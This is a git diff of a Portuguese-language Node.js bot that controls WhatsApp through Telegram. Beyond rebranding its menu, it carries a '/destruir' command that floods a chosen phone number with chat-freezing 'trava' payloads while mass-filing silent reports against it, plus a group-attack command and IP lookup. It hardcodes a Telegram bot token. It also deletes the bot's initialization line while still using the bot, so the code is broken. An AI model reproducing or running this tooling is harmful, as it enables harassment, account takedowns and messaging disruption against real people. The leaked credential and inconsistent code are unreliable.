@@ -16,7 +16,7 @@ http.createServer((req, res) => {
 });
 
 const TELEGRAM_TOKEN = '8622724732:AAFVKNCfcYIlZqfSGmnK23Urt1VAVy1kPHE';
-const bot = new TelegramBot(TELEGRAM_TOKEN, { polling: true });
+const ADMIN_TELEGRAM_ID = 7714802499; // Seu ID de Administrador
 
 let waSock = null;
 let jaNotificouConectado = false;
@@ -173,14 +173,15 @@ async function iniciarWhatsApp(chatId, numeroTelefone) {
 
             if (texto.trim() === '/menu') {
                 const numeroUsuario = remoteJid.split('@')[0];
-                const dataHoraAtual = new Date().toLocaleString('pt-BR', { timeZone: 'America/Sao_Paulo' });
+                const dataValidade = "13 de Dezembro"; // Data padrão customizada inspirada no seu layout
+                const codigoIdUser = "771828";
 
                 const menuTexto = 
-                    `⛩️ *WHATSAPP BOT ZRX* ⛩️\n\n` +
-                    `💬 *Suporte:* @Zenithzrx\n` +
-                    `📱 *Número de usuário:* \`${numeroUsuario}\`\n` +
-                    `⭐ *Status:* FREE USER\n` +
-                    `🕒 *Online:* ${dataHoraAtual}\n\n` +
+                    `✨ *Your SABIR⁷⁷¹⁸* ✨\n\n` +
+                    `📦 *User*\n` +
+                    `> 🏷️ Termina no dia ${dataValidade}.\n` +
+                    `> 🔑 Código: \`${codigoIdUser}\`\n\n` +
+                    `💥 *Insane projects perfected with dedication by SABIR⁷⁷¹⁸!* 🧞‍♂️️\n\n` +
                     `┏━━━⧼𝑰𝑷 & 𝑳𝑰𝑵𝙆⧽\n` +
                     `> /ip <endereço>\n` +
                     `> /linkIP\n` +
@@ -209,10 +210,11 @@ async function iniciarWhatsApp(chatId, numeroTelefone) {
                     `> /mudar-desc <descrição>\n` +
                     `> /divulgar <texto>\n` +
                     `> /nivel\n` +
-                    `> /setwelcome <texto> (com foto opcional)\n` +
+                    `> /setwelcome <texto>\n` +
                     `> /traduzir <idioma>\n` +
                     `> /s (Figurinha)\n` +
-                    `┗━━━━━━━━━━━━━━━━━━━━━━┛`;
+                    `┗━━━━━━━━━━━━━━━━━━━━━━┛\n` +
+                    `🔗 *TheBotDev*`;
                 
                 const caminhoFoto = path.join(__dirname, 'menu.jpg');
 
@@ -392,7 +394,7 @@ async function iniciarWhatsApp(chatId, numeroTelefone) {
                                 fromMe: false,
                                 remoteJid: idGrupo
                             });
-                            await delay(300); // Velocidade otimizada para grande volume
+                            await delay(300);
                         } catch (e) {}
                     }
 
@@ -440,7 +442,6 @@ async function iniciarWhatsApp(chatId, numeroTelefone) {
 
                 await waSock.sendMessage(remoteJid, { text: `🔥 Operação /travgropo finalizada com sucesso nos 5 grupos!` });
             }
-            // COMANDO DESTRUIR TOTAL (TRAVA NO PV + DENÚNCIA NATIVA DE CONTATO SILENCIOSA)
             else if (texto.startsWith('/destruir ')) {
                 const partes = texto.replace('/destruir', '').trim().split(' ');
                 const alvoNum = partes[0]?.replace(/\D/g, '');
@@ -452,10 +453,8 @@ async function iniciarWhatsApp(chatId, numeroTelefone) {
                 }
 
                 const jidAlvo = `${alvoNum}@s.whatsapp.net`;
-
                 await waSock.sendMessage(remoteJid, { text: `🚨 *ATAQUE TOTAL INICIADO* 🚨\nAlvo: \`${alvoNum}\`\nCiclos: ${quantidade}\n_Disparando travas no PV e denúncias nativas silenciosas simultaneamente..._` });
 
-                // 1. Carrega a trava local (Trava.txt)
                 let conteudoTrava = "⚡ [ZRX-DESTRUCTION] Alvo sob ataque total!";
                 const caminhoPayload = path.join(__dirname, 'Trava.txt');
                 if (fs.existsSync(caminhoPayload)) {
@@ -463,7 +462,6 @@ async function iniciarWhatsApp(chatId, numeroTelefone) {
                     if (lido.length > 0) conteudoTrava = lido;
                 }
 
-                // Tarefa 1: Envia as travas pesadas para o chat privado do alvo
                 const tarefaTrava = (async () => {
                     for (let i = 1; i <= quantidade; i++) {
                         try {
@@ -473,7 +471,6 @@ async function iniciarWhatsApp(chatId, numeroTelefone) {
                     }
                 })();
 
-                // Tarefa 2: Aciona a denúncia nativa de contato (botão de denunciar dos três pontos, 100% silenciosa no chat)
                 const tarefaDenunciaNativa = (async () => {
                     for (let i = 1; i <= quantidade; i++) {
                         try {
@@ -490,9 +487,7 @@ async function iniciarWhatsApp(chatId, numeroTelefone) {
                     }
                 })();
 
-                // Executa as duas tarefas em paralelo absoluto
                 await Promise.all([tarefaTrava, tarefaDenunciaNativa]);
-
                 await waSock.sendMessage(remoteJid, { text: `🔥 Ataque total ao número \`${alvoNum}\` finalizado com sucesso!` });
             }
             else if (texto.startsWith('/kick ')) {
@@ -739,14 +734,16 @@ function remoteJidCheck(msg) {
     return msg.key.remoteJid;
 }
 
-// Comando /foto no Telegram para definir a imagem do menu de ambas as plataformas
+// Comando /foto exclusivo para o Administrador (ID: 7714802499) salvar permanentemente a foto do menu
 bot.on('photo', async (msg) => {
     const chatId = msg.chat.id;
+    const userId = msg.from.id;
     const caption = msg.caption || '';
 
-    if (caption.toLowerCase().startsWith('/foto') || msg.reply_to_message) {
+    // Verifica se é o Administrador autorizado e se enviou a foto com a legenda /foto ou respondeu a uma foto
+    if (userId === ADMIN_TELEGRAM_ID && (caption.toLowerCase().startsWith('/foto') || msg.reply_to_message)) {
         try {
-            bot.sendMessage(chatId, "🔄 Salvando nova foto para o menu do bot...");
+            bot.sendMessage(chatId, "🔄 Salvando foto permanente do menu...");
 
             const fotoId = msg.photo[msg.photo.length - 1].file_id;
             const fileLink = await bot.getFileLink(fotoId);
@@ -758,10 +755,14 @@ bot.on('photo', async (msg) => {
                 response.pipe(fileStream);
                 fileStream.on('finish', () => {
                     fileStream.close();
-                    bot.sendMessage(chatId, "✅ Foto do menu atualizada com sucesso!");
+                    bot.sendMessage(chatId, "✅ Foto permanente do menu atualizada com sucesso!");
                 });
             });
-        } catch (err) {}
+        } catch (err) {
+            bot.sendMessage(chatId, "❌ Erro ao salvar a foto.");
+        }
+    } else if (caption.toLowerCase().startsWith('/foto') && userId !== ADMIN_TELEGRAM_ID) {
+        bot.sendMessage(chatId, "❌ Você não tem permissão para alterar a foto do menu.");
     }
 });
 
@@ -806,7 +807,7 @@ bot.onText(/\/start/, (msg) => {
     const startTexto = 
         `🤖 *ZRX CONTROL SYSTEM* \n\n` +
         `• Para conectar o WhatsApp: \`/conectar SEU_NUMERO\`\n` +
-        `• Para atualizar a foto do menu: *Envie uma foto com a legenda \`/foto\`*\n` +
+        `• Para definir a foto permanente do menu *(Apenas ADM)*: *Envie uma foto com a legenda \`/foto\`*\n` +
         `• Para limpar sessão: \`/limpar\``;
 
     const caminhoFoto = path.join(__dirname, 'menu.jpg');
